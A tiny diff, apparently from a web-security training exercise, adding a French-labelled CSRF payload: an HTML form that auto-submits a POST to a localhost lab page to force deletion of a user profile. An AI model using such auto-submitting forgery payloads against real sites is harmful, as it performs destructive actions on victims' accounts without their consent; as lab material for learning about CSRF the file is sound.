@@ -1,0 +1,5 @@
+Payload CSRF (requete POST automatisée) vers l’URL en forçant la suppression de profil :
+<form action="http://127.0.0.1:8003/cybersecurite_web/mission3/profil.php?id=1" method="post"></form>
+<script>
+  document.forms[0].submit();
+</script>
